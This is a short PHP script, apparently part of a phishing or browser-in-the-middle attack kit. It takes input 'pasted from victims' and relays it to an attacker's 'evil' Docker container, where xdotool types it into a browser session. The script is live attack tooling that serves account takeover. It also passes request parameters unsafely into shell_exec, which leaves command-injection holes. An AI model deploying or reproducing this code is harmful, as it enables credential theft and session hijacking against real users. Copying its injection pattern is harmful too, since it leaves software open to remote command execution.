<?php
// receive pasted input from victims
$accesslog = "/etc/accesslog.txt";

function GET($var)  { return isset($_GET[$var])  ? htmlspecialchars($_GET[$var])  : null; }                                                                                                                                                    
function POST($var) { return isset($_POST[$var]) ? htmlspecialchars($_POST[$var]) : null; } 

function lookupServerId($reqid) {
	global $accesslog;

	$log = shell_exec("tac $accesslog | grep $reqid | head -n 1");
	
	if(!empty($log)) {
		$ex = explode("\t", $log);
		return str_replace("s", "", $ex[1]);
	} else {
		echo "[!] Error: server id not found";
		return "unkown";
	}
}

// get input data
if(isset($_GET["v"])) {
	// removing quotation marks, do not even try to escape!
	$v = str_replace("\"", "", $_GET["v"]);
}
$sid = lookupServerId(GET("reqid"));

error_log("sending string to evil instance: $v");

echo shell_exec("docker exec evil$sid xdotool type \"$v\"");

?>
